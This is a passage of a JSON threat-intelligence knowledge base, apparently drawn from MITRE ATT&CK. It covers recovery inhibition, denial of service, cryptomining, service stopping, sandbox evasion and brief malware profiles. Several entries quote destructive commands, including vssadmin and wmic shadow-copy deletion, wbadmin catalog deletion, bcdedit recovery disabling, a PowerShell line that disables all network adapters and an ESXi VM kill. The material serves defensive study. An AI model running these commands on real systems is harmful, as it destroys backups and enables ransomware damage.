    "description": "Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) This may deny access to available backups and recovery options.Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) Furthermore, adversaries may disable recovery notifications, then corrupt backups.(Citation: disable_notif_synology_ransom)A number of native Windows utilities have been used by adversaries to disable or delete system recovery features:* vssadmin.exe can be used to delete all volume shadow copies on a system - vssadmin.exe delete shadows /all /quiet* [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) can be used to delete volume shadow copies - wmic shadowcopy delete* wbadmin.exe can be used to delete the Windows Backup Catalog - wbadmin.exe delete catalog -quiet* bcdedit.exe can be used to disable automatic Windows recovery features by modifying boot configuration data - bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no* REAgentC.exe can be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected system* diskshadow.exe can be used to delete all volume shadow copies on a system - diskshadow delete shadows all (Citation: Diskshadow) (Citation: Crytox Ransomware)On network devices, adversaries may leverage [Disk Wipe](https://attack.mitre.org/techniques/T1561) to delete backup firmware images and reformat the file system, then [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations.On ESXi servers, adversaries may delete or encrypt snapshots of virtual machines to support [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486), preventing them from being leveraged as backups (e.g., via ` vim-cmd vmsvc/snapshot.removeall`).(Citation: Cybereason)Adversaries may also delete online backups that are connected to their network  whether via network storage media or through folders that sync to cloud services.(Citation: ZDNet Ransomware Backups 2020) In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, database backups, machine images, and prior versions of objects designed to be used in disaster recovery scenarios.(Citation: Dark Reading Code Spaces Cyber Attack)(Citation: Rhino Security Labs AWS S3 Ransomware)",
    "example_uses": [
      "can delete shadow copies using vssadmin.exe.",
      "can delete volume shadow copies using vssadmin delete shadows /all /quiet.",
      "can can remove all system restore points.",
      "can delete shadow volumes.",
      "disable recovery options and deletes shadow copies from the victim.",
      "deletes shadow copies to ensure that all the data cannot be restored easily.",
      "has used vssadmin Delete Shadows /all /quiet to to delete volume shadow copies and vssadmin resize shadowstorage to force deletion of shadow copies created by third-party applications.",
      "can delete shadow volumes using vssadmin.exe.",
      "removes backups of Volume Shadow Copies to disable any restoration capabilities.",
      "has deleted volume shadow copies using vssadmin.exe.",
      "can delete volume shadow copies on compromised hosts.",
      "can delete shadow copy backups with vssadmin.exe using the command `delete shadows /all /quiet`.",
      "deletes backups and shadow copies using native system tools.",
      "can delete the backup catalog from the target system using: `c:\\Windows\\System32\\wbadmin.exe delete catalog -quiet` and can also delete volume shadow copies using: `\\Windows\\System32\\vssadmin.exe delete shadows /all /quiet`.",
      "can delete system restore points through the command cmd.exe /c vssadmin delete shadows /for=c: /all /quiet.",
      "can disable the VSS service on a compromised host using the service control manager.",
      "uses vssadmin wbadmin bcdedit and wmic to delete and disable operating system recovery features.",
      "has used WMIC and vssadmin to manually delete volume shadow copies.  has also used  ransomware to delete volume shadow copies automatically with the use of vssadmin.",
      "has the ability to delete shadow volumes using vssadmin.exe delete shadows /all /quiet.",
      "attempts to remove the backup shadow files from the host using vssadmin.exe Delete Shadows /All /Quiet.",
      "can delete the infected system's Shadow Volumes to prevent recovery.",
      "has the ability to delete volume shadow copies on compromised hosts.",
      "can delete Windows Volume Shadow Copies using vssadmin.",
      "will delete system volume shadow copies via PowerShell commands.",
      "can delete the shadow volumes with vssadmin Delete Shadows /all /quiet and can use bcdedit to disable recovery options.",
      "can use `bcdedit` to delete different boot identifiers on a compromised host; it can also use `vssadmin.exe delete shadows /all /quiet` and `C:\\\\Windows\\\\system32\\\\wbem\\\\wmic.exe shadowcopy delete`.",
      "has the functionality to delete shadow copies.",
      "resets system restore points and deletes backup files.",
      "uses the native Windows utilities vssadmin wbadmin and bcdedit to delete and disable operating system recovery features such as the Windows backup catalog and Windows Automatic Repair.",
      "can use vssadmin to delete volume shadow copies and bcdedit to disable recovery features.",
      "has attempted to delete the shadow volumes of infected machines once before and once after the encryption process.",
      "can delete shadow copies using the `IVssBackupComponents` COM object to call the `DeleteSnapshots` method.",
      "has been observed deleting shadow copies to ensure that data cannot be restored easily.",
      "can use vssadmin.exe to remove volume shadow copies.",
      "can delete shadow copies using `vssadmin.exe delete shadows /all /quiet` and `wmic.exe Shadowcopy Delete`; it can also modify the boot loader using `bcdedit /set {default} recoveryenabled No`.",
      "can use AlphaVSS to delete shadow copies.",
      "can delete volume shadow copy backups from victim machines.",
      "wipes the boot sector of infected systems to inhibit system recovery.",
      "uses  to delete the backup catalog from the target system using: `C:\\Windows\\System32\\wbadmin.exe delete catalog -quiet` and to delete volume shadow copies using: `C:\\Windows\\System32\\vssadmin.exe delete shadows /all /quiet`.",
      "wipes the boot sector of infected machines to inhibit system recovery.",
      "has the ability to disable `SystemRestore` and Volume Shadow Copies.",
      "modifies volume shadow copies during execution in a way that destroys them on the victim machine.",
      "deletes all volume shadow copies and restore points among other actions to inhibit system recovery following ransomware deployment.",
      "resized and deleted volume shadow copy files to prevent system recovery after encryption.",
      "has used `vssadmin.exe` to delete volume shadow copies.",
      "can delete volume shadow copies.",
      "has the ability to delete volume shadow copies on targeted hosts."
    ]
  },
  "attack-pattern--d74c4a7e-ffbf-432f-9365-7ebf1f787cab": {
    "id": "T1498",
    "name": "Network Denial of Service",
    "examples": [],
    "similar_words": [
      "Network Denial of Service"
    ],
    "description": "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)A Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).To perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.For DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).",
    "example_uses": [
      "In 2016  conducted a distributed denial of service (DDoS) attack against the World Anti-Doping Agency.",
      "enables multiple types of network denial of service capabilities across several protocols post-installation.",
      "can execute TCP UDP and HTTP denial of service (DoS) attacks."
    ]
  },
  "attack-pattern--cd25c1b4-935c-4f0e-ba8d-552f28bc4783": {
    "id": "T1496",
    "name": "Resource Hijacking",
    "examples": [],
    "similar_words": [
      "Resource Hijacking"
    ],
    "description": "Adversaries may leverage the resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability. Resource hijacking may take a number of different forms. For example, adversaries may:* Leverage compute resources in order to mine cryptocurrency* Sell network bandwidth to proxy networks* Generate SMS traffic for profit* Abuse cloud-based messaging services to send large quantities of spam messagesIn some cases, adversaries may leverage multiple types of Resource Hijacking at once.(Citation: Sysdig Cryptojacking Proxyjacking 2023)",
    "example_uses": [
      "can use system resources to mine cryptocurrency dropping XMRig to mine Monero.",
      "is a kernel-mode rootkit used for cryptocurrency mining.",
      "has loaded coinmining software onto systems to mine for Koto cryptocurrency.",
      "has distributed cryptomining malware.",
      "can download an additional module which has a cryptocurrency mining extension.",
      "harvested system resources to mine cryptocurrency using XMRig to mine Monero.",
      "can deploy follow-on cryptocurrency mining payloads.",
      "has used XMRIG to mine cryptocurrency on victim systems.",
      "has the capability to run a cryptocurrency miner on the victim machine.",
      "has deployed XMRig Docker images to mine cryptocurrency.  has also infected Docker containers and Kubernetes clusters with XMRig and used RainbowMiner and lolMiner for mining cryptocurrency.",
      "deployed a Monero cryptocurrency mining tool in a victims environment.",
      "has used xmrig to mine cryptocurrency.",
      "has created and run a Bitcoin cryptocurrency miner."
    ]
  },
  "attack-pattern--ca205a36-c1ad-488b-aa6c-ab34bdd3a36b": {
    "id": "T1494",
    "name": "Runtime Data Manipulation",
    "examples": [],
    "similar_words": [
      "Runtime Data Manipulation"
    ],
    "description": "Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nAdversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct [Change Default File Association](https://attack.mitre.org/techniques/T1042) and [Masquerading](https://attack.mitre.org/techniques/T1036) to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
    "example_uses": []
  },
  "attack-pattern--20fb2507-d71c-455d-9b6d-6104461cf26b": {
    "id": "T1489",
    "name": "Service Stop",
    "examples": [],
    "similar_words": [
      "Service Stop"
    ],
    "description": "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.(Citation: Talos Olympic Destroyer 2018)(Citation: Novetta Blockbuster) Adversaries may accomplish this by disabling individual services of high importance to an organization, such as MSExchangeIS, which will make Exchange content inaccessible.(Citation: Novetta Blockbuster) In some cases, adversaries may stop or disable many or all services to render systems unusable.(Citation: Talos Olympic Destroyer 2018) Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct [Data Destruction](https://attack.mitre.org/techniques/T1485) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) on the data stores of services like Exchange and SQL Server, or on virtual machines hosted on ESXi infrastructure.(Citation: SecureWorks WannaCry Analysis)(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)",
    "example_uses": [
      "can kill several processes and services related to backups and security solutions.",
      "can kill processes and delete services.",
      "can disconnect all network adapters on a compromised host using `powershell -Command Get-WmiObject -class Win32_NetworkAdapter | ForEach { If ($.NetEnabled) { $.Disable() } } > NUL`.",
      "attempts to kill processes associated with Exchange Microsoft SQL Server and MySQL to make it possible to encrypt their data stores.",
      "can use `RmShutDown` to kill applications and services using the resources that are targeted for encryption.",
      "will terminate services using the Service Control Manager (SCM) API.",
      "looks for and attempts to stop database processes.",
      "uses the API call ChangeServiceConfigW to disable all services on the affected system.",
      "has the ability to terminate VM processes on compromised hosts through execution of `esxcli vm process kill`.",
      "has attempted to stop the MSSQL Windows service to ensure successful encryption using `C:\\Windows\\System32\\net.exe stop MSSQLSERVER`.",
      "can stop the MS SQL service at the end of the encryption process to release files locked by the service.",
      "has the ability to stop VM services on compromised networks.",
      "stops 181 Windows services on the system before beginning the encryption process.",
      "has stopped the MSExchangeIS service to render Exchange contents inaccessible to users.",
      "can stop specific services related to backups.",
      "has the capability to stop services and kill processes.",
      "can stop up to 146 Windows services related to security backup database and email solutions through the use of net stop.",
      "has called kill.bat for stopping services disabling services and killing processes.",
      "has a hardcoded list of services and processes to terminate.",
      "has shut down virtual machines from within a victim's on-premise VMware ESXi infrastructure.",
      "can stop and disable services on the system.",
      "s data wiper module writes zeros into the registry keys in SYSTEM\\CurrentControlSet\\Services to render a system inoperable.",
      "terminates various processes to get the user to reboot the victim machine.",
      "has attempted to stop services associated with business applications and databases to release the lock on files used by these applications so they may be encrypted.",
      "has the capability to stop processes and services.",
      "has the ability to stop services on the infected host.",
      "stops database data backup solution antivirus and ICS-related processes.",
      "has terminated specific processes before encryption.",
      "has used taskkill.exe and net.exe to stop backup catalog cloud and other services prior to network encryption.",
      "can stop services and processes.",
      "has the ability to stop the Volume Shadow Copy service.",
      "has stopped SQL services to ensure it can encrypt any database.",
      "has used  to stop services prior to the execution of ransomware.",
      "can terminate system processes and services some of which relate to backup software.",
      "attempts to stop the MSSQL Windows service to ensure successful encryption of locked files.",
      "can disable critical services and processes.",
      "can issue a command to kill a process on compromised hosts.",
      "can stop Windows services.",
      "can automatically terminate processes that may interfere with the encryption or file extraction processes.",
      "has the ability to terminate a list of services and processes.",
      "can terminate running services.",
      "can terminate targeted processes and services related to security backup database management and other applications that could stop or interfere with encryption.",
      "has the ability to terminate specified services.",
      "can stop running virtual machines."
    ]
  },
  "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92": {
    "id": "T1492",
    "name": "Stored Data Manipulation",
    "examples": [],
    "similar_words": [
      "Stored Data Manipulation"
    ],
    "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
    "example_uses": []
  },
  "attack-pattern--0fff2797-19cb-41ea-a5f1-8a9303b8158e": {
    "id": "T1501",
    "name": "Systemd Service",
    "examples": [],
    "similar_words": [
      "Systemd Service"
    ],
    "description": "Systemd services can be used to establish persistence on a Linux system. The systemd service manager is commonly used for managing background daemon processes (also known as services) and other system resources.(Citation: Linux man-pages: systemd January 2014)(Citation: Freedesktop.org Linux systemd 29SEP2018) Systemd is the default initialization (init) system on many Linux distributions starting with Debian 8, Ubuntu 15.04, CentOS 7, RHEL 7, Fedora 15, and replaces legacy init systems including SysVinit and Upstart while remaining backwards compatible with the aforementioned init systems.\n\nSystemd utilizes configuration files known as service units to control how services boot and under what conditions. By default, these unit files are stored in the <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code> directories and have the file extension <code>.service</code>. Each service unit file may contain numerous directives that can execute system commands. \n\n* ExecStart, ExecStartPre, and ExecStartPost directives cover execution of commands when a services is started manually by 'systemctl' or on system start if the service is set to automatically start. \n* ExecReload directive covers when a service restarts. \n* ExecStop and ExecStopPost directives cover when a service is stopped or manually by 'systemctl'.\n\nAdversaries have used systemd functionality to establish persistent access to victim systems by creating and/or modifying service unit files that cause systemd to execute malicious commands at recurring intervals, such as at system boot.(Citation: Anomali Rocke March 2019)(Citation: gist Arch package compromise 10JUL2018)(Citation: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018)\n\nWhile adversaries typically require root privileges to create/modify service unit files in the <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code> directories, low privilege users can create/modify service unit files in directories such as <code>~/.config/systemd/user/</code> to achieve user-level persistence.(Citation: Rapid7 Service Persistence 22JUNE2016)",
    "example_uses": []
  },
  "attack-pattern--cc1e737c-236c-4e3b-83ba-32039a626ef8": {
    "id": "T1493",
    "name": "Transmitted Data Manipulation",
    "examples": [],
    "similar_words": [
      "Transmitted Data Manipulation"
    ],
    "description": "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
    "example_uses": []
  },
  "attack-pattern--82caa33e-d11a-433a-94ea-9b5a5fbef81d": {
    "id": "T1497",
    "name": "Virtualization/Sandbox Evasion",
    "examples": [],
    "similar_words": [
      "Virtualization/Sandbox Evasion"
    ],
    "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)Adversaries may use several methods to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.(Citation: Unit 42 Pirpi July 2015)",
    "example_uses": [
      "has used several anti-emulation techniques to prevent automated analysis by emulators or sandboxes.",
      "has the ability to perform anti-sandboxing and anti-virtualization checks.",
      "can check to determine if the compromised system is running on VMware.",
      "has removed various hooks before installing the trojan or bootkit to evade sandbox analysis or other analysis software.",
      "can make a random number of calls to the `kernel32.beep` function to hinder log analysis.",
      "During  the threat actors used droppers that would run anti-analysis checks before executing malware on a compromised host.",
      "can attempt to overload sandbox analysis by sending 1550 calls to printf.",
      "can use junk code to generate random activity to obscure malware behavior.",
      "includes runtime checks to identify an analysis environment and prevent execution on it.",
      "has embedded a vmdetect.exe executable to identify virtual machines at the beginning of execution.",
      "has the ability to perform anti-virtualization checks.",
      "can detect if it is running within a sandbox or other virtualized analysis environment.",
      "malware has employed just-in-time decryption of strings to evade sandbox detection.",
      "has used multiple anti-analysis and anti-sandbox techniques to prevent automated analysis by sandboxes.",
      "Some versions of  will check to ensure it is not being executed inside a virtual machine or a known malware analysis sandbox environment. If it detects that it is it will exit.",
      "can sleep for a time interval between C2 communication attempts.",
      "has the ability to use anti-detection functions to identify sandbox environments.",
      "has contained a hardcoded list of IP addresses to block that belong to sandboxes and analysis platforms.",
      "has used a macro to check that an ActiveDocument shape object in the lure message is present. If this object is not found the macro will exit without downloading additional payloads.",
      "has manipulated Keitaro Traffic Direction System to filter researcher and sandbox traffic.",
      "contains several anti-analysis and anti-virtualization checks.",
      "contains real and fake second-stage payloads following initial execution with the real payload only delivered if the malware determines it is not running in a virtualized environment.",
      "can utilize decoy command and control domains within the malware configuration to circumvent sandbox analysis.",
      "payloads have used control flow obfuscation techniques such as excessively long code blocks of mathematical instructions to defeat sandboxing and related analysis methods."
    ]
  },
  "malware--e7a5229f-05eb-440e-b982-9a6d2b2b87c8": {
    "id": "S0331",
    "name": "Agent Tesla",
    "examples": [],
    "similar_words": [
      "Agent Tesla"
    ],
    "description": "[Agent Tesla](https://attack.mitre.org/software/S0331) is a spyware Trojan written for the .NET framework that has been observed since at least 2014.(Citation: Fortinet Agent Tesla April 2018)(Citation: Bitdefender Agent Tesla April 2020)(Citation: Malwarebytes Agent Tesla April 2020)",
    "example_uses": []
  },
  "malware--edb24a93-1f7a-4bbf-a738-1397a14662c6": {
    "id": "S0373",
    "name": "Astaroth",
    "examples": [],
    "similar_words": [
      "Astaroth"
    ],
    "description": "[Astaroth](https://attack.mitre.org/software/S0373) is a Trojan and information stealer known to affect companies in Europe, Brazil, and throughout Latin America. It has been known publicly since at least late 2017. (Citation: Cybereason Astaroth Feb 2019)(Citation: Cofense Astaroth Sept 2018)(Citation: Securelist Brazilian Banking Malware July 2020)",
    "example_uses": []
  },
  "malware--24b4ce59-eaac-4c8b-8634-9b093b7ccd92": {
    "id": "S0347",
    "name": "AuditCred",
    "examples": [],
    "similar_words": [
      "AuditCred",
      "Roptimizer"
    ],
    "description": "[AuditCred](https://attack.mitre.org/software/S0347) is a malicious DLL that has been used by [Lazarus Group](https://attack.mitre.org/groups/G0032) during their 2018 attacks.(Citation: TrendMicro Lazarus Nov 2018)",
    "example_uses": []
  },
  "malware--f9b05f33-d45d-4e4d-aafe-c208d38a0080": {
    "id": "S0344",
    "name": "Azorult",
    "examples": [],
    "similar_words": [
      "Azorult"
    ],
    "description": "[Azorult](https://attack.mitre.org/software/S0344) is a commercial Trojan that is used to steal information from compromised hosts. [Azorult](https://attack.mitre.org/software/S0344) has been observed in the wild as early as 2016.\nIn July 2018, [Azorult](https://attack.mitre.org/software/S0344) was seen used in a spearphishing campaign against targets in North America. [Azorult](https://attack.mitre.org/software/S0344) has been seen used for cryptocurrency theft. (Citation: Unit42 Azorult Nov 2018)(Citation: Proofpoint Azorult July 2018)",
    "example_uses": []
  },
  "malware--d5268dfb-ae2b-4e0e-ac07-02a460613d8a": {
    "id": "S0360",
    "name": "BONDUPDATER",
    "examples": [],
    "similar_words": [
      "BONDUPDATER"
    ],
    "description": "[BONDUPDATER](https://attack.mitre.org/software/S0360) is a PowerShell backdoor used by [OilRig](https://attack.mitre.org/groups/G0049). It was first observed in November 2017 during targeting of a Middle Eastern government organization, and an updated version was observed in August 2018 being used to target a government organization with spearphishing emails.(Citation: FireEye APT34 Dec 2017)(Citation: Palo Alto OilRig Sep 2018)",
    "example_uses": []
  },
  "malware--9af05de0-bc09-4511-a350-5eb8b06185c1": {
    "id": "S0337",
    "name": "BadPatch",
    "examples": [],
    "similar_words": [
      "BadPatch"
    ],
    "description": "[BadPatch](https://attack.mitre.org/software/S0337) is a Windows Trojan that was used in a Gaza Hackers-linked campaign.(Citation: Unit 42 BadPatch Oct 2017)",
    "example_uses": []
  },
  "malware--d20b397a-ea47-48a9-b503-2e2a3551e11d": {
    "id": "S0351",
    "name": "Cannon",
    "examples": [],
    "similar_words": [
      "Cannon"
    ],
    "description": "[Cannon](https://attack.mitre.org/software/S0351) is a Trojan with variants written in C# and Delphi. It was first observed in April 2018. (Citation: Unit42 Cannon Nov 2018)(Citation: Unit42 Sofacy Dec 2018)",
    "example_uses": []
  },
  "malware--b7e9880a-7a7c-4162-bddb-e28e8ef2bf1f": {
    "id": "S0335",
    "name": "Carbon",
    "examples": [],
    "similar_words": [
      "Carbon"
    ],
    "description": "[Carbon](https://attack.mitre.org/software/S0335) is a sophisticated, second-stage backdoor and framework that can be used to steal sensitive information from victims. [Carbon](https://attack.mitre.org/software/S0335) has been selectively used by [Turla](https://attack.mitre.org/groups/G0010) to target government and foreign affairs-related organizations in Central Asia.(Citation: ESET Carbon Mar 2017)(Citation: Securelist Turla Oct 2018)",
    "example_uses": []
  },
  "malware--b879758f-bbc4-4cab-b5ba-177ac9b009b4": {
    "id": "S0348",
    "name": "Cardinal RAT",
    "examples": [],
    "similar_words": [
      "Cardinal RAT"
    ],
    "description": "[Cardinal RAT](https://attack.mitre.org/software/S0348) is a potentially low volume remote access trojan (RAT) observed since December 2015. [Cardinal RAT](https://attack.mitre.org/software/S0348) is notable for its unique utilization of uncompiled C# source code and the Microsoft Windows built-in csc.exe compiler.(Citation: PaloAlto CardinalRat Apr 2017)",
    "example_uses": []
  },
  "malware--aa1462a1-d065-416c-b354-bedd04998c7f": {
    "id": "S0338",
    "name": "Cobian RAT",
    "examples": [],
    "similar_words": [
      "Cobian RAT"
    ],
    "description": "[Cobian RAT](https://attack.mitre.org/software/S0338) is a backdoor, remote access tool that has been observed since 2016.(Citation: Zscaler Cobian Aug 2017)",
    "example_uses": []
  },
  "malware--d1531eaa-9e17-473e-a680-3298469662c3": {
    "id": "S0369",
    "name": "CoinTicker",
    "examples": [],
    "similar_words": [
      "CoinTicker"
    ],
    "description": "[CoinTicker](https://attack.mitre.org/software/S0369) is a malicious application that poses as a cryptocurrency price ticker and installs components of the open source backdoors EvilOSX and EggShell.(Citation: CoinTicker 2019)",
    "example_uses": []
  },
  "malware--53ab35c2-d00e-491a-8753-41d35ae7e547": {
    "id": "S0334",
    "name": "DarkComet",
    "examples": [],
    "similar_words": [
      "DarkComet",
      "DarkKomet",
      "Fynloski",
      "Krademok",
      "FYNLOS"
    ],
    "description": "[DarkComet](https://attack.mitre.org/software/S0334) is a Windows remote administration tool and backdoor.(Citation: TrendMicro DarkComet Sept 2014)(Citation: Malwarebytes DarkComet March 2018)",
    "example_uses": []
  },
  "malware--f25aab1a-0cef-4910-a85d-bb38b32ea41a": {
    "id": "S0354",
    "name": "Denis",
    "examples": [],
    "similar_words": [
      "Denis"
    ],
    "description": "[Denis](https://attack.mitre.org/software/S0354) is a Windows backdoor and Trojan used by [APT32](https://attack.mitre.org/groups/G0050). [Denis](https://attack.mitre.org/software/S0354) shares several similarities to the [SOUNDBITE](https://attack.mitre.org/software/S0157) backdoor and has been used in conjunction with the [Goopy](https://attack.mitre.org/software/S0477) backdoor.(Citation: Cybereason Oceanlotus May 2017)",
    "example_uses": []
  },
  "malware--d6b3fcd0-1c86-4350-96f0-965ed02fcc51": {
    "id": "S0377",
    "name": "Ebury",
    "examples": [],
    "similar_words": [
      "Ebury"
    ],
    "description": "[Ebury](https://attack.mitre.org/software/S0377) is an OpenSSH backdoor and credential stealer targeting Linux servers and container hosts developed by [Windigo](https://attack.mitre.org/groups/G0124). [Ebury](https://attack.mitre.org/software/S0377) is primarily installed through modifying shared libraries (`.so` files) executed by the legitimate OpenSSH program. First seen in 2009, [Ebury](https://attack.mitre.org/software/S0377) has been used to maintain a botnet of servers, deploy additional malware, and steal cryptocurrency wallets, credentials, and credit card details.(Citation: ESET Ebury Feb 2014)(Citation: BleepingComputer Ebury March 2017)(Citation: ESET Ebury Oct 2017)(Citation: ESET Ebury May 2024)",
    "example_uses": []
  },
  "malware--32066e94-3112-48ca-b9eb-ba2b59d2f023": {
    "id": "S0367",
    "name": "Emotet",
    "examples": [],
    "similar_words": [
      "Emotet",
      "Geodo"
    ],
    "description": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014, initially targeting the financial sector, and has expanded to multiple verticals over time.(Citation: Trend Micro Banking Malware Jan 2019)",
    "example_uses": []
  },
  "malware--051eaca1-958f-4091-9e5f-a9acd8f820b5": {
    "id": "S0343",
    "name": "Exaramel for Windows",
    "examples": [],
    "similar_words": [
      "Exaramel",
      "Exaramel for Windows"
    ],
    "description": "[Exaramel for Windows](https://attack.mitre.org/software/S0343) is a backdoor used for targeting Windows systems. The Linux version is tracked separately under [Exaramel for Linux](https://attack.mitre.org/software/S0401).(Citation: ESET TeleBots Oct 2018)",
    "example_uses": []
  },
  "malware--a2282af0-f9dd-4373-9b92-eaf9e11e0c71": {
    "id": "S0355",
    "name": "Final1stspy",
    "examples": [],
    "similar_words": [
      "Final1stspy"
    ],
    "description": "[Final1stspy](https://attack.mitre.org/software/S0355) is a dropper family that has been used to deliver [DOGCALL](https://attack.mitre.org/software/S0213).(Citation: Unit 42 Nokki Oct 2018)",
    "example_uses": []
  },
  "malware--308b3d68-a084-4dfb-885a-3125e1a9c1e8": {
    "id": "S0342",
    "name": "GreyEnergy",
    "examples": [],
    "similar_words": [
      "GreyEnergy"
    ],
    "description": "[GreyEnergy](https://attack.mitre.org/software/S0342) is a backdoor written in C and compiled in Visual Studio. [GreyEnergy](https://attack.mitre.org/software/S0342) shares similarities with the [BlackEnergy](https://attack.mitre.org/software/S0089) malware and is thought to be the successor of it.(Citation: ESET GreyEnergy Oct 2018)",
    "example_uses": []
  },
  "malware--454fe82d-6fd2-4ac6-91ab-28a33fe01369": {
    "id": "S0376",
    "name": "HOPLIGHT",
    "examples": [],
    "similar_words": [
      "HOPLIGHT"
    ],
    "description": "[HOPLIGHT](https://attack.mitre.org/software/S0376) is a backdoor Trojan that has reportedly been used by the North Korean government.(Citation: US-CERT HOPLIGHT Apr 2019)",
    "example_uses": []
  },
  "malware--86b92f6c-9c05-4c51-b361-4c7bb13e21a1": {
    "id": "S0356",
    "name": "KONNI",
    "examples": [],
    "similar_words": [
      "KONNI"
    ],
    "description": "[KONNI](https://attack.mitre.org/software/S0356) is a remote access tool that security researchers assess has been used by North Korean cyber actors since at least 2014. [KONNI](https://attack.mitre.org/software/S0356) has significant code overlap with the [NOKKI](https://attack.mitre.org/software/S0353) malware family, and has been linked to several suspected North Korean campaigns targeting political organizations in Russia, East Asia, Europe and the Middle East; there is some evidence potentially linking [KONNI](https://attack.mitre.org/software/S0356) to [APT37](https://attack.mitre.org/groups/G0067).(Citation: Talos Konni May 2017)(Citation: Unit 42 NOKKI Sept 2018)(Citation: Unit 42 Nokki Oct 2018)(Citation: Medium KONNI Jan 2020)(Citation: Malwarebytes Konni Aug 2021)",
    "example_uses": []
  },
  "malware--0efefea5-78da-4022-92bc-d726139e8883": {
    "id": "S0362",
    "name": "Linux Rabbit",
    "examples": [],
    "similar_words": [
      "Linux Rabbit"
    ],
    "description": "[Linux Rabbit](https://attack.mitre.org/software/S0362) is malware that targeted Linux servers and IoT devices in a campaign lasting from August to October 2018. It shares code with another strain of malware known as Rabbot. The goal of the campaign was to install cryptocurrency miners onto the targeted servers and devices.(Citation: Anomali Linux Rabbit 2018)\n",
    "example_uses": []
  },
  "malware--5af7a825-2d9f-400d-931a-e00eb9e27f48": {
    "id": "S0372",
    "name": "LockerGoga",
    "examples": [],
    "similar_words": [
      "LockerGoga ",
      "LockerGoga"
    ],
